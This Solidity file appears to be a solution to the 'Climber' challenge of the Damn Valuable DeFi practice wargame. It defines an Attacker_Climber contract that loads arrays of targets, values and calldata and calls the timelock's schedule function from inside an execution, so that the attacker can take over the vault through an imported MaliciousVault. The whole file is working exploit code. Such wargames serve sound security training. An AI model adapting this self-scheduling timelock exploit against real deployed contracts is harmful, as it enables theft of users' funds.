// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "../DamnValuableToken.sol";
import "./MaliciousVault.sol";

contract Attacker_Climber {
    ClimberTimelock private timelock;
    ClimberVault private vault;
    DamnValuableToken private dvt;
    MaliciousVault private maliciousVault;
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    address private player;

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        DamnValuableToken _token,
        MaliciousVault _maliciousVault,
        address _player
    ) {
        timelock = _timelock;
        vault = _vault;
        dvt = _token;
        maliciousVault = _maliciousVault;
        player = _player;
    }

    function data(
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _dataElements
    ) external {
        targets = _targets;
        values = _values;
        dataElements = _dataElements;
    }

    function attack() external {
        timelock.schedule(targets, values, dataElements, 0);
    }

    function scheduleHacked(
        address[] calldata _targets,
        uint256[] calldata _values,
        bytes[] calldata _dataElements,
        bytes32 _salt
    ) external {
        timelock.schedule(_targets, _values, _dataElements, _salt);
    }
}
